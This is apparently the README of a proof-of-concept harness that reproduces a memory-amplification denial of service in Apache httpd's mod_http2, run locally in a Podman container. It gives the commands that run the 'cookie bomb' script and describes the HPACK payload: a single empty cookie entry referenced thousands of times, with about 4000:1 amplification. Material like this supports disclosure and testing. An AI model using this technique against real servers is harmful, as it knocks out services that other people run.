# Apache httpd mod_http2 HPACK Cookie Repro

This is a Podman repro for Apache httpd `mod_http2` cookie-crumb memory amplification.

## Run

```bash
podman pull docker.io/library/httpd:latest
./run_httpd.sh
podman exec httpd-hpack-cookie httpd -M
podman stats --no-stream httpd-hpack-cookie
./hpack_httpd_cookie_bomb.py --connections 1 --streams 1 --refs 4091 --hold 20
podman stats --no-stream httpd-hpack-cookie
```

For a larger run:

```bash
./hpack_httpd_cookie_bomb.py --connections 1 --streams 25 --refs 4091 --hold 30
```

Use `monitor_rss.py` in another terminal for a live RSS trace:

```bash
./monitor_rss.py --name httpd-hpack-cookie
```

## Image Checked

The harness was built against `docker.io/library/httpd:latest`, observed as Apache `2.4.67`.

## Payload

The PoC sends TLS ALPN `h2`, sets `SETTINGS_INITIAL_WINDOW_SIZE=0`, inserts one HPACK dynamic table entry for `cookie: ""`, then sends one-byte indexed references to dynamic index `62`.

Default payload:

```text
refs=4091
header_block ~= 4.1 KiB
estimated_merge_alloc ~= 15.97 MiB per stream
wire-to-cookie-merge-allocation ~= 4000:1
```

See `AMPLIFICATION.md` for the math.
